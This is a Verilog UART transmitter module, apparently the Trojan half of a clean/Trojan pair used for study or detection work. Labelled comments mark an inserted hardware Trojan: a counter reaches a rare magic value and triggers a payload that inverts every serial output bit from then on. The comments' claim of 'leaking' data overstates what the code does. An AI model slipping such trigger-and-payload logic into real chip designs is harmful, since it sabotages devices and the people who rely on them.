// design_trojan.v
// The SAME rs232_tx module as design_clean.v, but with an OBVIOUS inserted
// hardware Trojan: a rare trigger (a 24-bit counter reaching a magic value)
// that activates a payload which corrupts the serial output (bit flip / leak).
module rs232_tx (
    input        clk,
    input        rst_n,
    input        send,
    input  [7:0] data_in,
    output reg   tx,
    output reg   busy
);

    // FSM states
    localparam IDLE  = 2'd0;
    localparam START = 2'd1;
    localparam SHIFT = 2'd2;
    localparam STOP  = 2'd3;

    reg [1:0] state;
    reg [2:0] bit_idx;
    reg [7:0] shreg;

    // TROJAN: hidden trigger state — a free-running counter and an arm flag.
    reg [23:0] trojan_cnt;    // TROJAN: rarely reaches the magic value
    reg        trojan_fire;   // TROJAN: payload enable latch

    // TROJAN: trigger logic — counts every clock; "fires" on a rare value.
    always @(posedge clk or negedge rst_n) begin
        if (!rst_n) begin
            trojan_cnt  <= 24'd0;
            trojan_fire <= 1'b0;
        end else begin
            trojan_cnt <= trojan_cnt + 24'd1;
            if (trojan_cnt == 24'hADBEEF)   // TROJAN: rare magic trigger value
                trojan_fire <= 1'b1;         // TROJAN: latch payload active
        end
    end

    always @(posedge clk or negedge rst_n) begin
        if (!rst_n) begin
            state   <= IDLE;
            tx      <= 1'b1;
            busy    <= 1'b0;
            bit_idx <= 3'd0;
            shreg   <= 8'd0;
        end else begin
            case (state)
                IDLE: begin
                    tx   <= 1'b1;
                    busy <= 1'b0;
                    if (send) begin
                        shreg <= data_in;
                        busy  <= 1'b1;
                        state <= START;
                    end
                end
                START: begin
                    tx      <= 1'b0;
                    bit_idx <= 3'd0;
                    state   <= SHIFT;
                end
                SHIFT: begin
                    // TROJAN payload: when armed, corrupt the transmitted bit
                    // by inverting it, garbling / leaking the serial data.
                    if (trojan_fire)
                        tx <= ~shreg[bit_idx];   // TROJAN: payload — bit flip
                    else
                        tx <= shreg[bit_idx];
                    if (bit_idx == 3'd7)
                        state <= STOP;
                    else
                        bit_idx <= bit_idx + 3'd1;
                end
                STOP: begin
                    tx    <= 1'b1;
                    busy  <= 1'b0;
                    state <= IDLE;
                end
                default: state <= IDLE;
            endcase
        end
    end

endmodule
